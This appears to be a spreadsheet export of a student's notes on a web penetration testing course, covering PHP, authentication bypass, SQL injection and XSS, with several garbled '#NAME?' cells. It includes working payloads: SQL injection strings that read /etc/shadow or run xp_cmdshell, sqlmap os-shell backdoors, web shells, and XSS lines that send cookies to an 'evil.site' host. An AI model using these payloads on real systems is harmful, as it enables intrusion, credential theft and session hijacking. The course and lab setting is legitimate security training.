S542-4.4.09,SEC542,JAD Decompiler,,,,,,#NAME?,4. Client-Side Disc.,4.4 Java Applets,B4P128,,,,,,sec542/4.4/index.htm#s9,,,,
S542-4.4.10,SEC542,JAD Decompiler,,,,,,#NAME?,4. Client-Side Disc.,4.4 Java Applets,B4P129,,,,,,sec542/4.4/index.htm#s10,,,,
S542-4.4.11,SEC542,JAD Usage,,,,,,#NAME?,4. Client-Side Disc.,4.4 Java Applets,B4P130,,,,,,sec542/4.4/index.htm#s11,,,,
S542-4.4.12,SEC542,,,,,,,,4. Client-Side Disc.,4.4 Java Applets,,,,,,,sec542/4.4/index.htm#s12,,,,
S542-4.4.13,SEC542,,,,,,,,4. Client-Side Disc.,4.4 Java Applets,,,,,,,sec542/4.4/index.htm#s13,,,,
S542-4.4.15,SEC542,JAD Exercise: Launch,,,,,,"- ?./jad ~/classes/MyAddress.class
- vi MyAddress.jad",4. Client-Side Disc.,4.4 Java Applets,B4P134,,,,,,sec542/4.4/index.htm#s15,,,,
S542-4.5.02,SEC542,Why PHP for Pen Testers,,,,,,"- Most common server-side scripting language
- Understand server apps and discover vulns
- Server-side weapons: build controller apps to gather data from client-side attacks, proxy client requests to bypass SOP...)",4. Client-Side Disc.,4.5 PHP,B4P137,,,,,,sec542/4.5/index.htm#s2,,,,
S542-4.5.03,SEC542,PHP,,,,,,"- PHP 5 is current version
- Widely used with Apache but MS now supports PHP with IIS",4. Client-Side Disc.,4.5 PHP,B4P138,,,,,,sec542/4.5/index.htm#s3,,,,
S542-4.5.04,SEC542,Server-Side PHP,,,,,,"- (as opposed to PHP in a script like Python)
- <?php ?> or <? ... ?> with server cfg'd with short tags
- Typically the output will be HTML (could also be AJAX/XML/JavaScript)",4. Client-Side Disc.,4.5 PHP,B4P139,,,,,,sec542/4.5/index.htm#s4,,,,
S542-4.5.05,SEC542,PHP Config Options,,,,,,"- register_globals=[ON|OFF]  (cookies, get, post as globals) or use local var such as $_POST[pageid] 
   Used to be the default (=ON), not a good idea: easy to override global vars, cookies, session states, user id
- display_errors=[ON|OFF]  (send errors to browser
  PHP errors often contain sensitive information  (installed path, function names, script path, config settings...)
- allow_url_fopen=[ON|OFF]  (allow file open from remote servers)
  If you absolutely need this, use some network controls to lower the risk",4. Client-Side Disc.,4.5 PHP,B4P140,,,,,,sec542/4.5/index.htm#s5,,,,
S542-4.5.06,SEC542,PHP Fundamentals,,,,,,"- Each statement is a comment to the server
- Case senstive, variables: $var_name, arrys: $array_name[#]
- If/Loop blocks: {}, Comments: //, # or /* */",4. Client-Side Disc.,4.5 PHP,B4P141,,,,,,sec542/4.5/index.htm#s6,,,,
S542-4.5.07,SEC542,PHP Variables,,,,,,"- Vars are loosely typed. The type is determined at run time
- Declared when using them:  $x=""Mike"";
- Vars declared outside of functions are accessible anywhere in the script
- Vars in a function are local to the function, except if using: global $var;",4. Client-Side Disc.,4.5 PHP,B4P142,,,,,,sec542/4.5/index.htm#s7,,,,
S542-4.4.14,SEC542,JAD Exercise: Launch,,,,,,#NAME?,4. Client-Side Disc.,4.4 Java Applets,B4P133,,,,,,sec542/4.4/index.htm#s14,,,,
S542-4.5.09,SEC542,PHP Control Statements,,,,,,"- while($i<=10){ $i++; }
- for ($x=0; $x<=5; $x++) { echo $x; }",4. Client-Side Disc.,4.5 PHP,B4P144,,,,,,sec542/4.5/index.htm#s9,,,,
S542-4.5.01,SEC542,PHP: Section Objectives,,,,,,"Fundamentals of PHP and it's capabilities, PHP Basics, and onfiguration options, PHP code block structure, variables, control statements, and language capabilities.",4. Client-Side Disc.,4.5 PHP,B4P136,,,,,,sec542/4.5/index.htm#s1,,,,
S542-4.4.16,SEC542,JAD Exercise: Review Source,,,,,,-,4. Client-Side Disc.,4.4 Java Applets,B4P135,,,,,,sec542/4.4/index.htm#s16,,,,
S542-4.5.08,SEC542,PHP: Accessing GET/POST Vars,,,,,,"- $_GET[], $_POST[]
- foreach ($_GET as $name => $value){
    print ""$name : $value<br>"";}
- $_POST[""Username""]
- Filter/validate before using them! (otherwise XSS, SQL Injection...)",4. Client-Side Disc.,4.5 PHP,B4P143,,,,,,sec542/4.5/index.htm#s8,,,,
S542-4.5.10,SEC542,PHP Conditional Statements,,,,,,"- if {} else {}
- switch($n){
     case 1:                 (case on integers or strings)
         some code;
         break;
     default:
         default code;
  }",4. Client-Side Disc.,4.5 PHP,B4P145,,,,,,sec542/4.5/index.htm#s10,,,,
S542-4.5.11,SEC542,PHP Functions,,,,,,"- function name(var, var){
     code;
  }
- Use with: name();",4. Client-Side Disc.,4.5 PHP,B4P146,,,,,,sec542/4.5/index.htm#s11,,,,
S542-4.5.14,SEC542,PHP Packages and PEAR,,,,,,"- PHP's main power comes from packages
- PHP comes with PEAR (PHP Extension and App Repository) to get/upload packages in the cloud
  # pear install pkgname  (root to intall for the whole server)
  # pear search searchstring     (eg: pear search SMTP)
- Useful packages: net_SMTP, Crypt_Blowfish, File_HtAccess, Services_Amazon_S3 (Amazon simple storage service)
- You could publish hacking tools this way...",4. Client-Side Disc.,4.5 PHP,B4P149,,,,,,sec542/4.5/index.htm#s14,,,,
S542-4.5.16,SEC542,PHP: HTTP Uses,,,,,,#NAME?,4. Client-Side Disc.,4.5 PHP,B4P151,,,,,,sec542/4.5/index.htm#s16,,,,
S542-4.5.17,SEC542,PHP Database Calls,,,,,,#NAME?,4. Client-Side Disc.,4.5 PHP,B4P152,,,,,,sec542/4.5/index.htm#s17,,,,
S542-4.5.18,SEC542,MySQL Functions in PHP,,,,,,"- MySQL:
   $db = mysql_connect(""localhost"", ""kevin"", ""mypasswd"");
   mysql_seelect_db(""zombiesdb"", $db);
   $sql = ""SELECT...""; 
   mysql_query($sql);  
- Oracle: $db = oci8_connect",4. Client-Side Disc.,4.5 PHP,B4P153,,,,,,sec542/4.5/index.htm#s18,,,,
S542-4.5.19,SEC542,,,,,,,,4. Client-Side Disc.,4.5 PHP,,,,,,,sec542/4.5/index.htm#s19,,,,
S542-4.5.20,SEC542,PHP Exercise,,,,,,#NAME?,4. Client-Side Disc.,4.5 PHP,B4P155,,,,,,sec542/4.5/index.htm#s20,,,,
S542-4.5.21,SEC542,PHP Exercise: Create PHP page,,,,,,"- <?php echo (""Hello World""); ?>
- Save to /var/www/php_exercise/index.php",4. Client-Side Disc.,4.5 PHP,B4P156,,,,,,sec542/4.5/index.htm#s21,,,,
S542-4.5.22,SEC542,PHP Exercise: Display Server Config,,,,,,#NAME?,4. Client-Side Disc.,4.5 PHP,B4P157,,,,,,sec542/4.5/index.htm#s22,,,,
S542-4.5.23,SEC542,PHP Exercise: Push JavaScript,,,,,,"- echo(""<script...",4. Client-Side Disc.,4.5 PHP,B4P158,,,,,,sec542/4.5/index.htm#s23,,,,
S542-4.5.24,SEC542,PHP Exercise: Write to a file,,,,,,#NAME?,4. Client-Side Disc.,4.5 PHP,B4P159,,,,,,sec542/4.5/index.htm#s24,,,,
S542-4.5.25,SEC542,PHP Exercise: Send info from JavaScrip to PHP,,,,,,#NAME?,4. Client-Side Disc.,4.5 PHP,B4P160,,,,,,sec542/4.5/index.htm#s25,,,,
S542-4.5.26,SEC542,,,,,,,,4. Client-Side Disc.,4.5 PHP,,,,,,,sec542/4.5/index.htm#s26,,,,
S542-4.5.27,SEC542,,,,,,,,4. Client-Side Disc.,4.5 PHP,,,,,,,sec542/4.5/index.htm#s27,,,,
S542-4.5.28,SEC542,Conclusions,,,,,,#NAME?,4. Client-Side Disc.,4.5 PHP,B4P163,,,,,,sec542/4.5/index.htm#s28,,,,
S542-5.1.01,SEC542,Exploitation (section start),,,,,,,5. Exploitation,5.1 Auth. Bypass,B5P01,,,,,,sec542/5.1/index.htm#s1,,,,
S542-5.1.02,SEC542,,,,,,,,5. Exploitation,5.1 Auth. Bypass,,,,,,,sec542/5.1/index.htm#s2,,,,
S542-5.1.03,SEC542,,,,,,,,5. Exploitation,5.1 Auth. Bypass,,,,,,,sec542/5.1/index.htm#s3,,,,
S542-5.1.04,SEC542,,,,,,,,5. Exploitation,5.1 Auth. Bypass,,,,,,,sec542/5.1/index.htm#s4,,,,
S542-4.5.12,SEC542,PHP and Cookies,,,,,,"- setcookie(name, value, expire, path, domain);
  setcookie(""username"", ""Kevin"", ""Fri, 27-feb-2009"", ""/"", ""sec542.org"");
- $username = $_COOKIE[""username""];",4. Client-Side Disc.,4.5 PHP,B4P147,,,,,,sec542/4.5/index.htm#s12,,,,
S542-4.5.13,SEC542,PHP Superglobal Arrays,,,,,,"- $_GET, $_POST, $_COOKIE
- $_SERVER: server settings (script name, client address...) 
- $_ENV: vars set within the server env. running PHP
- $_SESSION: values put into the session state of the app
- $_FILES: array contain any files uploaded",4. Client-Side Disc.,4.5 PHP,B4P148,,,,,,sec542/4.5/index.htm#s13,,,,
S542-4.5.15,SEC542,PHP HTTP Request Handling,,,,,,"- Many packages for HTTP but libCurl is built-in
- <?php
   $ch = curl_init();
   curl_setopt($ch, CURLOPT_URL, ""http://www.sans.org/login.php"");
   curl_setopt($ch, CURLOPT_POST, 1);
   curl_setopt($ch, CURLOPT_POSTFIELDS, ""name=Matt&pass=Q#RAgae"");
   $resp = curl_exec($ch);
   curl_close($ch); ?>",4. Client-Side Disc.,4.5 PHP,B4P150,,,,,,sec542/4.5/index.htm#s15,,,,
S542-5.1.05,SEC542,Exploitation,,,,,,"- Last step (reporting is par of each step). Use previous steps to expand foothold
- Careful not to cause larger issues (DOS, opening holes, reset passwords, active shellcode...)
- Use scope limiting features",5. Exploitation,5.1 Auth. Bypass,B5P05,,,,,,sec542/5.1/index.htm#s5,,,,
S542-5.1.06,SEC542,Previous Steps,,,,,,#NAME?,5. Exploitation,5.1 Auth. Bypass,B5P06,,,,,,sec542/5.1/index.htm#s6,,,,
S542-5.1.07,SEC542,Expand the Foothold,,,,,,"-Expand foothold (beachhead). Pivot through app to find other flaws. Launch other attacks over the network. 
- Ref: 3 part webcast: Pentest Perfect Storm (combined pen tests)
- Better understand the risk to the Org.",5. Exploitation,5.1 Auth. Bypass,B5P07,,,,,,sec542/5.1/index.htm#s7,,,,
S542-5.1.08,SEC542,Exploits,,,,,,"- Focus on 3 categories: Bypass, Injection, Session-based exploits
- Think as an evil person. What can you do with the exploit?  What access does it give you? Be able to explain real world attacks (don't exagerate, don't be sarcastic). What is the business problem that can be caused? ",5. Exploitation,5.1 Auth. Bypass,B5P08,,,,,,sec542/5.1/index.htm#s8,,,,
S542-5.1.09,SEC542,,,,,,,,5. Exploitation,5.1 Auth. Bypass,,,,,,,sec542/5.1/index.htm#s9,,,,
S542-5.1.11,SEC542,Authentication Bypass,,,,,,"- Accessing restricted content without authentication (admin console, higher priv., greater scope)
- Exploits the lack of auth. verification within the app (auth. bolted-on after dev.)
- Common with apps using SSO (code pushed from developer's desktop to dev/QA server w/o the auth used in Prod)",5. Exploitation,5.1 Auth. Bypass,B5P11,,,,,,sec542/5.1/index.htm#s11,,,,
S542-5.1.12,SEC542,Bypass Methods,,,,,,"- Use site maps (during mapping phase) and access resources directly
- Manually: access pages with a browser. Also try URL parameters (keys, IDs) and Cookies (authenticated=yes)
- Scripts: brute force page names, simple iteration (pageid=NUM), using previous results...",5. Exploitation,5.1 Auth. Bypass,B5P12,,,,,,sec542/5.1/index.htm#s12,,,,
S542-5.1.13,SEC542,Pivot Point,,,,,,"- Back to mapping from exploited point (new pages...). 
- Create new attack vectors (using new starting point and/or new privileges)",5. Exploitation,5.1 Auth. Bypass,B5P13,,,,,,sec542/5.1/index.htm#s13,,,,
S542-5.1.14,SEC542,,,,,,,,5. Exploitation,5.1 Auth. Bypass,,,,,,,sec542/5.1/index.htm#s14,,,,
S542-5.1.15,SEC542,Auth. Bypass Exercise: The Flaw,,,,,,#NAME?,5. Exploitation,5.1 Auth. Bypass,B5P15,,,,,,sec542/5.1/index.htm#s15,,,,
S542-5.1.16,SEC542,,,,,,,,5. Exploitation,5.1 Auth. Bypass,,,,,,,sec542/5.1/index.htm#s16,,,,
S542-5.1.18,SEC542,Auth. Bypass Exercise: Testing,,,,,,"- After, try a 2nd vulnerability exercise using Burp agains base_main.php (instead of base_maintenance.php)",5. Exploitation,5.1 Auth. Bypass,B5P18,,,,,,sec542/5.1/index.htm#s18,,,,
S542-5.1.19,SEC542,,,,,,,,5. Exploitation,5.1 Auth. Bypass,,,,,,,sec542/5.1/index.htm#s19,,,,
S542-5.1.17,SEC542,Auth. Bypass Exercise: Build HTML Exploit,,,,,,"'- I used Burp to intercept login POST form and modified it as followed:
  ?POST URI    :  /base/base_maintenance.php
  POST Parms: ?standalone=yes",5. Exploitation,5.1 Auth. Bypass,B5P17,,,,,,sec542/5.1/index.htm#s17,,,,
S542-5.2.02,SEC542,SQL Injection Example,,,,,,"- Input is passed directly to query (without or with poor filtering)
- Traditional example, enter: ' or 1=1 --
- Query becomes: select user from users where login='' or 1=1 --'",5. Exploitation,5.2 SQL Injection,B5P22,,,,,,sec542/5.2/index.htm#s2,,,,
S542-5.2.03,SEC542,Other Traditional Examples,,,,,,"- Numeric: 1 or 1=1 --
- Double quotes: "" or 1=1 --",5. Exploitation,5.2 SQL Injection,B5P23,,,,,,sec542/5.2/index.htm#s3,,,,
S542-5.2.04,SEC542,Always True,,,,,,-,5. Exploitation,5.2 SQL Injection,B5P24,,,,,,sec542/5.2/index.htm#s4,,,,
S542-5.1.20,SEC542,Injection Flaws (Illustrated),,,,,,"Injection targetting the different tiers:
Database: SQL Injection targets the backend data store
Web Svr: Command Injection targets the OS. Code Injection targets the app.
Browser: CSRF targets the trust an app has in the user (transaction injection). XSS targets the clients of the app. HTTP Response Splitting enhances other attacks",5. Exploitation,5.1 Auth. Bypass,B5P20,,,,,,sec542/5.1/index.htm#s20,,,,
S542-5.2.01,SEC542,SQL Injection: Section Objectives,,,,,,"How to perform SQL injection attacks and how to identify SQL injection, vulnerabilities in applications, what makes an app vulnerablr, common SQL commands used in injection attacks, File Handling with SQL injection, OS Interaction with SQL Injection, Port scanning with SQL Injection, File Injection using, SQL Injection, and Blind SQL Injection.",5. Exploitation,5.2 SQL Injection,B5P21,,,,,,sec542/5.2/index.htm#s1,,,,
S542-5.2.05,SEC542,SQL Review,,,,,,"- Common SQL cmds: Select, Insert, 
- Update, Delete, Drop: be careful (can mod. stuff you don't want to). Take note of inserts and let the client delete them.
- Union: both record sets have to have the same number of fields",5. Exploitation,5.2 SQL Injection,B5P25,,,,,,sec542/5.2/index.htm#s5,,,,
S542-5.2.08,SEC542,Extend our Attack,,,,,,#NAME?,5. Exploitation,5.2 SQL Injection,B5P28,,,,,,sec542/5.2/index.htm#s8,,,,
S542-5.2.09,SEC542,,,,,,,,5. Exploitation,5.2 SQL Injection,,,,,,,sec542/5.2/index.htm#s9,,,,
S542-5.2.10,SEC542,MySQL: Reading Files,,,,,,"- Use load_file() function by using UNION by injecting:
  ' union select load_file('/etc/shadow'),1 #
- Load data read files into tables:
  load data infile 'c:\filename' into table temp",5. Exploitation,5.2 SQL Injection,B5P30,,,,,,sec542/5.2/index.htm#s10,,,,
S542-5.2.11,SEC542,MySQL: Writing files,,,,,,"- Dump data to file system using INTO
  SELECT * FROM table INTO dumpfile '/result';
- Make sure MySQL has permissions to directory (often runs as root)",5. Exploitation,5.2 SQL Injection,B5P31,,,,,,sec542/5.2/index.htm#s11,,,,
S542-5.2.06,SEC542,SQL INSERT,,,,,,"- Attacker doesn't know schema, some guessing
- To accomplish something like: INSERT into tablename (field1, field2, field3) VALUES ('val1', 'val2', 'val3')
- Try:   Foo');--   or    Foo',1);--   or     Foo',1,1);--   ...",5. Exploitation,5.2 SQL Injection,B5P26,,,,,,sec542/5.2/index.htm#s6,,,,
S542-5.2.07,SEC542,SQL Attack Ideas,,,,,,"- Bypass auth., retrieve records, modify transactions
- Add users, delete event logs, write files
- More evil: give my biggest competitor a 100% discount. Find somebody to tell the Distributor. Remove my competitiion...",5. Exploitation,5.2 SQL Injection,B5P27,,,,,,sec542/5.2/index.htm#s7,,,,
S542-5.2.14,SEC542,MSSQL: Write File,,,,,,"- No native way to write to files. Some ways around this.
1. xp_cmdshell to call osql.exe  (requires username/password)
   declare @cmd varchar(1000)
   select @cmd = 'osql -U -P -S -Q""select * from master..sysobjects"" -o""c:\osqloutput.txt"" -w500'
   exec master..xp_cmdshell @cmd
   exec master..xp_cmdshell 'echo more data >> c:\file.txt'
2. Create a stored procedure (requires permission to create objects. Uses VBS FileSystem Object (see slide notes)",5. Exploitation,5.2 SQL Injection,B5P34,,,,,,sec542/5.2/index.htm#s14,,,,
S542-5.2.15,SEC542,PostGRES: Read/Write File,,,,,,"- COPY mydata FROM '/etc/passwd'
- COPY mydata TO '/tmp/data'",5. Exploitation,5.2 SQL Injection,B5P35,,,,,,sec542/5.2/index.htm#s15,,,,
S542-5.2.16,SEC542,,,,,,,,5. Exploitation,5.2 SQL Injection,,,,,,,sec542/5.2/index.htm#s16,,,,
S542-5.2.17,SEC542,MSSQL: OS Interaction,,,,,,#NAME?,5. Exploitation,5.2 SQL Injection,B5P37,,,,,,sec542/5.2/index.htm#s17,,,,
S542-5.2.18,SEC542,OS Interaction Example,,,,,,"- 4 queries to run command and retrieve results
  ' ; EXEC master.xp_cmdshell 'route print > results.txt' --
  ' ; CREATE TABLE results (outp varchar(5000)); --
  ' ; BULK INSERT results FROM 'results.txt' with (rowterminator = ""\n\n\n\n""); --
  ' ; and 1 in (select outp from results) --",5. Exploitation,5.2 SQL Injection,B5P38,,,,,,sec542/5.2/index.htm#s18,,,,
S542-5.2.19,SEC542,Enabling xp_cmdshell,,,,,,"- Since MSSQL 2005, xp_cmdshell is disabled
- To reenable it:
   EXEC sp_configure 'show advanced options', 1; 
   RECONFIGURE; 
   EXEC sp_configure 'xp_cmdshell', 1; 
   RECONFIGURE;",5. Exploitation,5.2 SQL Injection,B5P39,,,,,,sec542/5.2/index.htm#s19,,,,
S542-5.2.12,SEC542,Oracle: Read/Write to File,,,,,,"- Set of stored procedures called utl_file (package), uses ora.ini for paths
declare
f utl_file.file_type;
s varchar2(200);
begin
  f := utl_file.fopen('SOMEDATA', 'sample.txt', 'R');
  utl_file.get_line(f,s);
  utl_file.fclose(f);
  dbms_output.put_line(s);
end;
/",5. Exploitation,5.2 SQL Injection,B5P32,,,,,,sec542/5.2/index.htm#s12,,,,
S542-5.2.13,SEC542,MSSQL: Read File,,,,,,"- Uses Bulk Insert
  BULK INSERT table from 'c:\boot.ini' --
- Typically, we create the empty table first ",5. Exploitation,5.2 SQL Injection,B5P33,,,,,,sec542/5.2/index.htm#s13,,,,
S542-5.2.22,SEC542,sqlmap Exercise,,,,,,#NAME?,5. Exploitation,5.2 SQL Injection,B5P42,,,,,,sec542/5.2/index.htm#s22,,,,
S542-5.2.23,SEC542,sqlmap Exercise: Testing the Flaw,,,,,,"- /usr/bin/samurai/sqlmap directory
   ./sqlmap.py [--proxy http://127.0.0.1:8080] -u http://www.sec542.org/scanners/sqli.php?name=Kevin",5. Exploitation,5.2 SQL Injection,B5P43,,,,,,sec542/5.2/index.htm#s23,,,,
S542-5.2.24,SEC542,sqlmap Exercise: SQL Information,,,,,,"- ./sqlmap.py -u http://www.sec542.org/scanners/sqli.php?name=Kevin [--users | --current-user | --tables | --passwords]
'- ./sqlmap.py -h  (and try other options)",5. Exploitation,5.2 SQL Injection,B5P44,,,,,,sec542/5.2/index.htm#s24,,,,
S542-5.2.25,SEC542,sqlmap Exercise: Reading files,,,,,,- ./sqlmap.py -u http://www.sec542.org/scanners/sqli.php?name=Kevin -- read-file=/etc/hosts,5. Exploitation,5.2 SQL Injection,B5P45,,,,,,sec542/5.2/index.htm#s25,,,,
S542-5.2.26,SEC542,sqlmap Exercise: Run Commands,,,,,,"- ./sqlmap.py -u http://www.sec542.org/scanners/sqli.php?name=Kevin --os-shell
- Creates usable uploader.php and backdoor.php pages: ?http://www.sec542.org/test/backdoor.php?cmd=uname",5. Exploitation,5.2 SQL Injection,B5P46,,,,,,sec542/5.2/index.htm#s26,,,,
S542-5.2.27,SEC542,,,,,,,,5. Exploitation,5.2 SQL Injection,,,,,,,sec542/5.2/index.htm#s27,,,,
S542-5.2.20,SEC542,PostGRES: OS Interactions,,,,,,- SELECT system('cat /etc/passwd > /tmp/results.txt');,5. Exploitation,5.2 SQL Injection,B5P40,,,,,,sec542/5.2/index.htm#s20,,,,
S542-5.2.21,SEC542,,,,,,,,5. Exploitation,5.2 SQL Injection,,,,,,,sec542/5.2/index.htm#s21,,,,
S542-5.2.28,SEC542,MSSQL Port Scanning,,,,,,#NAME?,5. Exploitation,5.2 SQL Injection,B5P48,,,,,,sec542/5.2/index.htm#s28,,,,
S542-5.2.31,SEC542,SQL Injection: File Injection,,,,,,"- Inject file using SQL Injection to create a pivot point
- For example: SELECT ""Kevin"" from table; -- this returns a record set containing the string Kevin
- Use this in combination with writing output to a (php, jsp...) file and access it after",5. Exploitation,5.2 SQL Injection,B5P51,,,,,,sec542/5.2/index.htm#s31,,,,
S542-5.2.32,SEC542,File Injection Examples,,,,,,"- Inject a script and later call it with OS interaction
- Inject a web page (php/asp/cfm script) and later call it using the browser
- Since we may not be able to run the script in the web page, we may hook a client via XSS (future slides)",5. Exploitation,5.2 SQL Injection,B5P52,,,,,,sec542/5.2/index.htm#s32,,,,
S542-5.2.33,SEC542,,,,,,,,5. Exploitation,5.2 SQL Injection,,,,,,,sec542/5.2/index.htm#s33,,,,
S542-5.2.34,SEC542,Prepared Injection Files,,,,,,#NAME?,5. Exploitation,5.2 SQL Injection,B5P54,,,,,,sec542/5.2/index.htm#s34,,,,
S542-5.2.29,SEC542,MSSQL Port Scanning Example,,,,,,"- SELECT * FROM OPENROWSET ('SQLoledb', 'uid=sa; pwd=; Network=DBNETLIB; Address=10.5.32.1,80; timeout=5', 'SELECT * FROM table')
- OPENROWSET is based on usage of two DB, retrieving data in one DB from another
- Real credentials not needed
- Result based on error message: 
  --> Closed: SQL Server does not exist or access denied)
  --> Open: OLE DB Provider 'sqloledb' reported an error.""
- Doesn't work to find other SQL servers (same error regardless)",5. Exploitation,5.2 SQL Injection,B5P49,,,,,,sec542/5.2/index.htm#s29,,,,
S542-5.2.36,SEC542,AJAXShell,,,,,,#NAME?,5. Exploitation,5.2 SQL Injection,B5P56,,,,,,sec542/5.2/index.htm#s36,,,,
S542-5.2.37,SEC542,Laudanum,,,,,,"- http://laudanum.inguardians.com
- Multiple functions: DNS lookups, proxying requests (web, network), shells
- Scope limiting features: user authz, IP ACL (returns 404 otherwise)",5. Exploitation,5.2 SQL Injection,B5P57,,,,,,sec542/5.2/index.htm#s37,,,,
S542-5.2.38,SEC542,,,,,,,,5. Exploitation,5.2 SQL Injection,,,,,,,sec542/5.2/index.htm#s38,,,,
S542-5.2.39,SEC542,,,,,,,,5. Exploitation,5.2 SQL Injection,,,,,,,sec542/5.2/index.htm#s39,,,,
S542-5.2.40,SEC542,PHPShell Exercise,,,,,,"- cd /var/www/phpshell; sudo vi config.php (add commands/aliases/username/password)
- In samurai VM, go to (username/pwd=samurai/samurai):
  http://127.0.0.1/phpshell/phpshell.php (in Samurai Tools bookmarks)",5. Exploitation,5.2 SQL Injection,B5P60,,,,,,sec542/5.2/index.htm#s40,,,,
S542-5.2.41,SEC542,AJAXShell Exercise,,,,,,"- In samurai VM, go to (pwd=password):
  http://127.0.0.1/ajaxshell.php (in Samurai Tools bookmarks)",5. Exploitation,5.2 SQL Injection,B5P61,,,,,,sec542/5.2/index.htm#s41,,,,
S542-5.2.30,SEC542,,,,,,,,5. Exploitation,5.2 SQL Injection,,,,,,,sec542/5.2/index.htm#s30,,,,
S542-5.2.43,SEC542,Blind SQL Injection,,,,,,#NAME?,5. Exploitation,5.2 SQL Injection,B5P63,,,,,,sec542/5.2/index.htm#s43,,,,
S542-5.2.44,SEC542,,,,,,,,5. Exploitation,5.2 SQL Injection,,,,,,,sec542/5.2/index.htm#s44,,,,
S542-5.2.35,SEC542,PHPShell,,,,,,"- http://phpshell.sourceforge.net
- 2 files: phpshell.php, config.php (usernames, command aliases or BASE64 encoding for IDS evasion)",5. Exploitation,5.2 SQL Injection,B5P55,,,,,,sec542/5.2/index.htm#s35,,,,
S542-5.2.42,SEC542,,,,,,,,5. Exploitation,5.2 SQL Injection,,,,,,,sec542/5.2/index.htm#s42,,,,
S542-5.2.45,SEC542,Blind SQL Injection Exercise,,,,,,-,5. Exploitation,5.2 SQL Injection,B5P65,,,,,,sec542/5.2/index.htm#s45,,,,
S542-5.2.46,SEC542,,,,,,,,5. Exploitation,5.2 SQL Injection,,,,,,,sec542/5.2/index.htm#s46,,,,
S542-5.2.47,SEC542,,,,,,,,5. Exploitation,5.2 SQL Injection,,,,,,,sec542/5.2/index.htm#s47,,,,
S542-5.2.48,SEC542,,,,,,,,5. Exploitation,5.2 SQL Injection,,,,,,,sec542/5.2/index.htm#s48,,,,
S542-5.2.49,SEC542,,,,,,,,5. Exploitation,5.2 SQL Injection,,,,,,,sec542/5.2/index.htm#s49,,,,
S542-5.3.01,SEC542,XSS: Section Objectives,,,,,,"Types of XSS attacks, how to identify XSS vulnerabilities, and how to perform them, the different types and characteristics of XSS attacks, XSS with GET and POST, XSS exploit types, filter evasion, and advanced injection techniques.",5. Exploitation,5.3 XSS,B5P72,,,,,,sec542/5.3/index.htm#s1,,,,
S542-5.3.02,SEC542,Cross Site Scripting,,,,,,"- Should be called script injection
- 2 types: persistent, reflexive
- 3rd type: Local DOM-based XSS (attack non-web application client using JavaScript)
- The most underestimated attack",5. Exploitation,5.3 XSS,B5P73,,,,,,sec542/5.3/index.htm#s2,,,,
S542-5.2.50,SEC542,,,,,,,,5. Exploitation,5.2 SQL Injection,,,,,,,sec542/5.2/index.htm#s50,,,,
S542-5.2.51,SEC542,,,,,,,,5. Exploitation,5.2 SQL Injection,,,,,,,sec542/5.2/index.htm#s51,,,,
S542-5.3.05,SEC542,XSS: Reading Cookies,,,,,,"<script>document.write('
  <img src=""http://evil.site/' + document.cookie + '"">
')</script>
--> in the HTTP logs (404 error with referrer logging), use cookie to hijack the session",5. Exploitation,5.3 XSS,B5P77,,,,,,sec542/5.3/index.htm#s5,,,,
S542-5.3.06,SEC542,XSS: Cookie Catcher Script,,,,,,"- Instead of viewing web server logs, we can use server-side PHP to parse received cookies from XSS attacks
- See slide for details.  $cookies = $_SERVER['REQUEST_URI']; ... ; fwrite(...)...",5. Exploitation,5.3 XSS,B5P78,,,,,,sec542/5.3/index.htm#s6,,,,
S542-5.3.07,SEC542,XSS: Redirecting a User,,,,,,"- Inject client-side code to redirect a user
  <script>window.location.href = ""otherpage.html""</script>
- Or by changing a form:
  document.forms[1].action""http://www.sec542.org/"";
- User clicks the injected/modified link (he trusts the site), then get redirected to malicious content
- Redirect user to their bank website and let the browser submit saved credentials and create a session, then later send back the session details to attacker (with cookie catcher).",5. Exploitation,5.3 XSS,B5P79,,,,,,sec542/5.3/index.htm#s7,,,,
S542-5.3.08,SEC542,XSS: External Scripts,,,,,,"- Reference external scripts:
   <script src=""http://evil.site/bad.js""></script>",5. Exploitation,5.3 XSS,B5P80,,,,,,sec542/5.3/index.htm#s8,,,,
S542-5.3.09,SEC542,XSS Filtering Evasion,,,,,,"- More common now for sites to filter input against XSS
- Typically done by blacklisting strings (alert, script)
- Often trivial to bypass these blacklists, see http://ha.ckers.org/xss.html",5. Exploitation,5.3 XSS,B5P81,,,,,,sec542/5.3/index.htm#s9,,,,
S542-5.3.03,SEC542,POST XSS Flaws,,,,,,"- Harder to demonstrate (in a report, to reproduce)
- Use a GET to POST redirectors (eg: get code from www.whiteacid.org/misc/misc/xss_post_forwarder.php)
- Install a redirector on your own server with access control",5. Exploitation,5.3 XSS,B5P74,,,,,,sec542/5.3/index.htm#s3,,,,
S542-5.3.04,SEC542,Typical Exploits with XSS,,,,,,#NAME?,5. Exploitation,5.3 XSS,B5P76,,,,,,sec542/5.3/index.htm#s4,,,,
S542-5.3.10,SEC542,XSS Filtering Evasion Examples,,,,,,"- The traditional attack (that gets filtered):
   <script>alert(""XSS"")</script>
- Simple evasion, add javascript in unexpected places:
  <img src=""javascript:alert('XSS');"">
- Malformed  tags. Browsers are permissive and fix HTML bugs so XSS is not caught by filtering
  <img """"""><script>alert(""XSS"")</script>"">     (triple double-quote fixed to double)",5. Exploitation,5.3 XSS,B5P82,,,,,,sec542/5.3/index.htm#s10,,,,
S542-5.3.13,SEC542,,,,,,,,5. Exploitation,5.3 XSS,,,,,,,sec542/5.3/index.htm#s13,,,,
S542-5.3.14,SEC542,Persistent XSS Exercise: Login PHPBB,,,,,,#NAME?,5. Exploitation,5.3 XSS,B5P86,,,,,,sec542/5.3/index.htm#s14,,,,
S542-5.3.15,SEC542,Persistent XSS Exercise: Inject XSS String,,,,,,"- Select a forum and create a topic with content: 
  ?<b c="">"" onmouseover=""alert('Gotcha!')"" X=""<B "">H E L L O !</B>",5. Exploitation,5.3 XSS,B5P87,,,,,,sec542/5.3/index.htm#s15,,,,
S542-5.3.16,SEC542,,,,,,,,5. Exploitation,5.3 XSS,,,,,,,sec542/5.3/index.htm#s16,,,,
S542-5.3.17,SEC542,Persistent XSS Exercise: XSS attack to steak cookies,,,,,,"- Edit same post  but replace the content with:
?<b c="">"" onmouseover=""alert(document.location='http://127.0.0.1/cookiecatcher.php?' + document.cookie)"" X=""<B "">H E L L O !</B>",5. Exploitation,5.3 XSS,B5P89,,,,,,sec542/5.3/index.htm#s17,,,,
S542-5.3.18,SEC542,Persistent XSS Exercise: Examine Stolen Cookies,,,,,,"?$ cat /tmp/cookiedump
